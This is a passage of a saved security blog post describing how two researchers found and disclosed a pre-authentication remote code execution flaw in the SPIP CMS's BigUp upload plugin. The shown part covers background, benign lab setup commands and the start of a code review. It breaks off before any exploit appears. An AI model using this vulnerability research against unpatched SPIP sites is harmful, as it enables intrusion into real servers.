<!DOCTYPE html>
<!-- saved from url=(0077)https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_2_a_big_upload/ -->
<html lang="en" class="fontawesome-i2svg-active fontawesome-i2svg-complete"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link href="https://gmpg.org/xfn/11" rel="profile">
    <script type="text/javascript" async="" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/js"></script><script async="" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/custom.js.tải xuống"></script>
    
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public">
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5">
<meta name="generator" content="Hugo 0.57.2">

    
    
    

<title>Spip Preauth RCE 2024: Part 2, A Big Upload • Think
Love
Share</title>


<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Spip Preauth RCE 2024: Part 2, A Big Upload">
<meta name="twitter:description" content="Another Spip Research article! This time, we&#39;ll tell you the story of how Vozec &amp; I got a new unauth RCE on Spip v3.4.1! This all started by a cute challenge of mine, and ended like it always do, in an eval!">

<meta property="og:title" content="Spip Preauth RCE 2024: Part 2, A Big Upload">
<meta property="og:description" content="Another Spip Research article! This time, we&#39;ll tell you the story of how Vozec &amp; I got a new unauth RCE on Spip v3.4.1! This all started by a cute challenge of mine, and ended like it always do, in an eval!">
<meta property="og:type" content="article">
<meta property="og:url" content="/hacking/spip_preauth_rce_2024_part_2_a_big_upload/">
<meta property="article:published_time" content="2024-09-04T00:00:00+00:00">
<meta property="article:modified_time" content="2024-09-04T00:00:00+00:00">


    


<link rel="stylesheet" href="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/github.min.css">




<link rel="stylesheet" href="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/hyde-hyde.css">
<link rel="stylesheet" href="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/custom.css">
<link rel="stylesheet" href="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/print.min.css" media="print">
<script defer="" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/all.js.tải xuống" integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy" crossorigin="anonymous">
</script>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thinkloveshare.com/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="https://thinkloveshare.com/favicon.png">
    
</head>

    <body>
        
<div class="sidebar">
  <div class="container sidebar-about ">
      <span class="site__title">
        <a href="https://thinkloveshare.com/">Think
Love
Share</a>
      </span>
          <a href="https://thinkloveshare.com/">
          
          
          
          <div class="author-image">
            <img src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
      <p class="site__description">
        <a href="https://thinkloveshare.com/">
         InfoSec, Code, Thoughts &amp; Feels 
      </a>
      </p>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="https://thinkloveshare.com/hacking/">
						<span>Hacking</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/offenskill/">
						<span>OffenSkill</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/streaming/">
						<span>Streaming</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/the_rest/">
						<span>The Rest</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/sponso/">
						<span>Sponso</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/about/">
						<span>About</span>
					</a>
				</li>
			
		
	</ul>
</div>

    <section class="social">
	
	<a href="https://twitter.com/TheLaluka" rel="me"><svg class="svg-inline--fa fa-twitter fa-w-16 rotate fa-lg" aria-hidden="true" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i> --></a>
	
	
	
	<a href="https://github.com/Laluka" rel="me"><svg class="svg-inline--fa fa-github fa-w-16 rotate fa-lg" aria-hidden="true" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="rotate fab fa-github fa-lg" aria-hidden="true"></i> --></a>
	
	
	
	<a href="https://gitlab.com/TheLaluka" rel="me"><svg class="svg-inline--fa fa-gitlab fa-w-16 rotate fa-lg" aria-hidden="true" data-prefix="fab" data-icon="gitlab" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M29.782 199.732L256 493.714 8.074 309.699c-6.856-5.142-9.712-13.996-7.141-21.993l28.849-87.974zm75.405-174.806c-3.142-8.854-15.709-8.854-18.851 0L29.782 199.732h131.961L105.187 24.926zm56.556 174.806L256 493.714l94.257-293.982H161.743zm349.324 87.974l-28.849-87.974L256 493.714l247.926-184.015c6.855-5.142 9.711-13.996 7.141-21.993zm-85.404-262.78c-3.142-8.854-15.709-8.854-18.851 0l-56.555 174.806h131.961L425.663 24.926z"></path></svg><!-- <i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i> --></a>
	
	
	
	<a href="https://linkedin.com/in/loukajc" rel="me"><svg class="svg-inline--fa fa-linkedin fa-w-14 rotate fa-lg" aria-hidden="true" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i> --></a>
	
	
	
	
	
	
	
	
	<a href="mailto:loukajc@gmail.com" rel="me"><svg class="svg-inline--fa fa-at fa-w-16 rotate fa-lg" aria-hidden="true" data-prefix="fas" data-icon="at" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M256 8C118.941 8 8 118.919 8 256c0 137.059 110.919 248 248 248 48.154 0 95.342-14.14 135.408-40.223 12.005-7.815 14.625-24.288 5.552-35.372l-10.177-12.433c-7.671-9.371-21.179-11.667-31.373-5.129C325.92 429.757 291.314 440 256 440c-101.458 0-184-82.542-184-184S154.542 72 256 72c100.139 0 184 57.619 184 160 0 38.786-21.093 79.742-58.17 83.693-17.349-.454-16.91-12.857-13.476-30.024l23.433-121.11C394.653 149.75 383.308 136 368.225 136h-44.981a13.518 13.518 0 0 0-13.432 11.993l-.01.092c-14.697-17.901-40.448-21.775-59.971-21.775-74.58 0-137.831 62.234-137.831 151.46 0 65.303 36.785 105.87 96 105.87 26.984 0 57.369-15.637 74.991-38.333 9.522 34.104 40.613 34.103 70.71 34.103C462.609 379.41 504 307.798 504 232 504 95.653 394.023 8 256 8zm-21.68 304.43c-22.249 0-36.07-15.623-36.07-40.771 0-44.993 30.779-72.729 58.63-72.729 22.292 0 35.601 15.241 35.601 40.77 0 45.061-33.875 72.73-58.161 72.73z"></path></svg><!-- <i class="rotate fas fa-at fa-lg" aria-hidden="true"></i> --></a>
	
	
    &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
    
    
    &nbsp;<a href="http://www.aperikube.fr/" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
    
    
    &nbsp;<a href="https://thinkloveshare-com.translate.goog/?_x_tr_sl=en&amp;_x_tr_tl=fr" target="blank" class="linklogo"><div class="rotate translate_logo logohover"></div></a>
    
</section>

    <section class="social">
  <div>
    Need a <b>Training</b>,<br><b>Pentest</b>, or <b>Code Audit</b>?
    <div class="h-wrap">
      Visit<a href="https://offenskill.com/" target="blank" class="linklogo linkoffenskill">OffenSkill.com</a>
      <a href="https://offenskill.com/" target="blank" class="linklogo"><div class="rotate offenskill_logo logohover"></div></a>
    </div>
  </div>
</section>

    <p class="copyright">
      © 2025 Laluka.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Licensing</a>.
      <br>Built with
      <a href="https://gohugo.io/">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Spip Preauth RCE 2024: Part 2, A Big Upload</h1>
    
    
<div class="post__meta">
    
      <svg class="svg-inline--fa fa-calendar-alt fa-w-14" aria-hidden="true" data-prefix="fas" data-icon="calendar-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M436 160H12c-6.6 0-12-5.4-12-12v-36c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48v36c0 6.6-5.4 12-12 12zM12 192h424c6.6 0 12 5.4 12 12v260c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V204c0-6.6 5.4-12 12-12zm116 204c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40z"></path></svg><!-- <i class="fas fa-calendar-alt"></i> --> Sep 4, 2024
    
    
    <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="clock" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm57.1 350.1L224.9 294c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h48c6.6 0 12 5.4 12 12v137.7l63.5 46.2c5.4 3.9 6.5 11.4 2.6 16.8l-28.2 38.8c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg><!-- <i class="fas fa-clock"></i> --> 12 min read
    <svg class="svg-inline--fa fa-globe fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="globe" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M336.5 160C322 70.7 287.8 8 248 8s-74 62.7-88.5 152h177zM152 256c0 22.2 1.2 43.5 3.3 64h185.3c2.1-20.5 3.3-41.8 3.3-64s-1.2-43.5-3.3-64H155.3c-2.1 20.5-3.3 41.8-3.3 64zm324.7-96c-28.6-67.9-86.5-120.4-158-141.6 24.4 33.8 41.2 84.7 50 141.6h108zM177.2 18.4C105.8 39.6 47.8 92.1 19.3 160h108c8.7-56.9 25.5-107.8 49.9-141.6zM487.4 192H372.7c2.1 21 3.3 42.5 3.3 64s-1.2 43-3.3 64h114.6c5.5-20.5 8.6-41.8 8.6-64s-3.1-43.5-8.5-64zM120 256c0-21.5 1.2-43 3.3-64H8.6C3.2 212.5 0 233.8 0 256s3.2 43.5 8.6 64h114.6c-2-21-3.2-42.5-3.2-64zm39.5 96c14.5 89.3 48.7 152 88.5 152s74-62.7 88.5-152h-177zm159.3 141.6c71.4-21.2 129.4-73.7 158-141.6h-108c-8.8 56.9-25.6 107.8-50 141.6zM19.3 352c28.6 67.9 86.5 120.4 158 141.6-24.4-33.8-41.2-84.7-50-141.6h-108z"></path></svg><!-- <i class="fas fa-globe"></i> -->
    <a href="https://thinkloveshare-com.translate.goog/?_x_tr_sl=en&amp;_x_tr_tl=fr">Translate</a>
    <br> <svg class="svg-inline--fa fa-heart fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="heart" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"></path></svg><!-- <i class="fas fa-heart"></i> -->Any typos? Any ideas to suggest? Feedback appreciated!<svg class="svg-inline--fa fa-heart fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="heart" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"></path></svg><!-- <i class="fas fa-heart"></i> --><br>
</div>


  </header>
  <hr>
  <div class="post">
    

<blockquote>
<p>Hello dear reader,<br>
This article is the continuation of my Spip research, with a twist!<br>
One Spip Unauth RCE Challenge player (<a href="https://x.com/Vozec1">@Vozec1</a>) came to me with an extra question after solving my initial challenge: “I think I found another similar bug, are you already aware of this issue?”<br>
And I was not (code changes fast)! We therefore worked together to make the most out of it, here’s our co-written story! 💌</p>
</blockquote>

<h2 id="some-context">Some Context</h2>

<p>Hello, <a href="https://x.com/Vozec1">@Vozec1</a> here! 👋</p>

<p>A month ago, <a href="https://x.com/TheLaluka/">TheLaluka</a> <a href="https://x.com/TheLaluka/status/1821821709499961817">suggested</a> finding his preauth RCE in SPIP as a challenge.
The challenge was very nice and I had nothing to do, so I decided to take a look at this CMS.</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/tweet1.png" alt="./tweet1"></p>

<p>He gave us a hint to narrow down the attack surface, as the project is substantial.
So, with <a href="https://x.com/_Worty">Worty</a>, we found the vulnerability and <a href="https://x.com/TheLaluka/status/1824357306433253480">won the challenge</a>!</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/win.png" alt="win"></p>

<p><em>Above is a screenshot from the <a href="https://x.com/_barbhack_"><em>barbhack</em></a> rump we gave to release the yet-another-spip-rce-challenge: the one we’re disclosing today</em></p>

<p>He sent us 2 bottles of arranged rums to congratulate us <em>(what a prince!)</em> and everything could have ended there, but I enjoyed the challenge and it gave me a vague idea of how Spip works. I still had several subtleties in mind and still had some free time, so I thought I’d keep on looking for vulnerabilities.</p>

<p><img class="img_med" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/rhum.png" alt="rhum"></p>

<p>So I’m going to present what will lead to a new <code>RCE preauth on versions &lt;= 4.3.1</code> of this CMS:</p>

<ul>
<li><a href="https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html">blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html</a></li>
<li><a href="https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0702">www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0702</a></li>
</ul>

<p>I found the CVE in an authenticated way, then reached out to Laluka to verify it wasn’t already known. We then worked together to make it work without authentication, greatly increasing the impact!</p>

<p>In the same way as his original post, we proposed a <a href="https://x.com/TheLaluka/status/1829929188381344007">new challenge during the Barbhack 2024</a> event to find the vulnerability.</p>

<blockquote>
<p>This time, the winners were <a href="https://x.com/GuilhemRioux">GuilhemRioux</a>, and the second solve from <a href="https://x.com/Chocapikk_">Chocapikk_</a>! The third solve wanted to stay anon, therefore respecting their choice! 😉</p>
</blockquote>

<h2 id="setup">Setup</h2>

<p>The setup phase is quick, requiring only the CMS zip, an updated php and a few extensions such as <strong>php-xml</strong>, <strong>php-zip</strong> or <strong>php-sqlite3</strong>.<br>
<strong>libsodium</strong> is also used for cryptography, and can be installed via the php extension manager <a href="https://pecl.php.net/">pecl</a>.</p>

<p>For a quick installation, <strong>sqlite</strong> is very pleasant, as it allows a clean installation without having to deploy and rely on an external database.</p>

<p>Here are the commands used:</p>

<pre><code class="language-bash hljs">mkdir spip3.4.1
<span class="hljs-built_in">cd</span> spip3.4.1
wget https://files.spip.net/spip/archives/spip-v4.3.1.zip
unzip spip-v4.3.1.zip
apt update
pecl install -f libsodium
apt install -y php-xml php-zip php-sqlite3
php -S 0.0.0.0:8000
</code></pre>

<p>The installation page can be found here: <a href="http://localhost:8000/spip.php?exec=install">http://localhost:8000/spip.php?exec=install</a></p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/spip_up.png" alt="./spip_up"></p>

<h2 id="code-review">Code review</h2>

<p>I had two ways of looking for vulnerable code in the php codebase.
The first was to trace my inputs on the various pages and see what code they triggered.
The second was to send payloads everywhere and see what resulted.</p>

<p>Both approaches are functional, especially on spip, which is notorious for evaluating just about anything in different places, “for some reasons”!</p>

<p>I decided to be clever and look for vulnerable sinks in the code.
The RCE for Laluka’s 1st challenge was in the code of the <strong>“PortePlume”</strong> plugin, used to enhance Spip’s native textbox. This plugin had already been audited, and although there was still a very promising RCE sink, I’d gone over this plugin and wanted to discover some new code.
So I naturally decided to audit other plugins installed by default.</p>

<p>I started looking at the BigUp plugin code. It’s a plugin used this time for file uploading. It’s going to take care of saving the various uploaded images to disk, renaming them appropriately, handling big chunked uploads, and more.</p>

<p>The plugin is quite substantial:</p>

<pre><code class="language-bash hljs">.
├── action
│&nbsp;&nbsp; └── bigup.php
├── balise
│&nbsp;&nbsp; └── saisie_fichier.php
├── bigup_administrations.php
├── bigup_fonctions.php
├── bigup_pipelines.php
├── CHANGELOG.md
├── composer.json
├── css
│&nbsp;&nbsp; [.. SNIPPED ..]
├── formulaires
│&nbsp;&nbsp; ├── configurer_bigup.html
│&nbsp;&nbsp; ├── tester_bigup_extended.html
│&nbsp;&nbsp; ├── tester_bigup_extended.php
│&nbsp;&nbsp; ├── tester_bigup.html
│&nbsp;&nbsp; └── tester_bigup.php
├── genie
│&nbsp;&nbsp; └── bigup_nettoyer_repertoire_upload.php
├── inc
│&nbsp;&nbsp; ├── Bigup
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── CacheFichiers.php
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── Cache.php
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── CacheRepertoire.php
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── Files.php
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── Flow.php
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── Formulaire.php
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── GestionRepertoires.php
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── Identifier.php
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── LogTrait.php
│&nbsp;&nbsp; │&nbsp;&nbsp; └── Repondre.php
│&nbsp;&nbsp; └── Bigup.php
├── javascript
